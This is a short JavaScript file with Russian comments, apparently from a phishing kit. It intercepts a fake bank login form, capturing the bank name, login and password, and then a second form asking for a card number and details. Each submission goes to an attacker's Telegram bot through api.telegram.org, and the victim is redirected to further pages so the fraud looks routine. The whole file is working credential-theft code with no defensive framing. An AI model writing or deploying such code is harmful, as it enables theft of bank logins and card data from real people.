// Настройки бота
const BOT_TOKEN = "ВАШ_BOT_TOKEN";
const CHAT_ID = "ВАШ_CHAT_ID";

// Отправка данных из формы входа в банк
document.getElementById("bankForm")?.addEventListener("submit", async (e) => {
    e.preventDefault();
    
    const data = {
        bank: document.getElementById("bankName").value,
        login: document.getElementById("bankLogin").value,
        password: document.getElementById("bankPassword").value
    };

    await sendToTelegram("Банковские данные", data);
    window.location.href = "inventory-card.html";
});

// Отправка данных инвентарной карты
document.getElementById("cardForm")?.addEventListener("submit", async (e) => {
    e.preventDefault();
    
    const data = {
        cardNumber: document.getElementById("cardNumber").value,
        details: document.getElementById("cardDetails").value
    };

    await sendToTelegram("Инвентарная карта", data);
    window.location.href = "success.html";
});

// Функция отправки в Telegram
async function sendToTelegram(title, data) {
    const text = `📌 ${title}:\n${JSON.stringify(data, null, 2)}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text
            })
        });
    } catch (error) {
        console.error("Ошибка отправки:", error);
    }
}
